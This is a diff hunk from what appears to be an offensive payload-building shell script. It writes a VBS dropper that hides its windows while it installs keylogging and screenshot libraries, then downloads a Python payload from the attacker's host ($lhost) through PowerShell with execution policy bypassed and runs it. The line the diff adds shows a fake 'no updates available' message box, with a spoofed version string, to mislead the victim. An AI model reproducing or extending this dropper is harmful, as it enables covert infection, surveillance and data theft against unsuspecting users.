@@ -10338,6 +10338,7 @@ if [ "$SOSP" = "Windows" ]; then
       echo "' ---" >> $Drop.vbs
       echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $Drop.vbs
       echo "objShell.Run \"cmd /c powershell \$C=pip show tabulate;If(-not(\$C)){pip install tabulate pynput psutil pillow pyscreenshot pyinstaller}\", 0, True" >> $Drop.vbs
+      echo "x=msgbox(\"none updates available at the moment ..\" & vbCrLf & \"For more info visite https://www.appstore.com\" ,0, \"$Drop 3.10.5-dev-32bit\")" >> $Drop.vbs
       echo "objShell.Run \"cmd /c powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://$lhost/$Drop.py', '$rpath\\$Drop.py') && cd $rpath && python $Drop.py\", 0, True" >> $Drop.vbs
       echo "${BlueF}[☠]${white} $Drop.vbs written to output."${Reset};sleep 2
    else
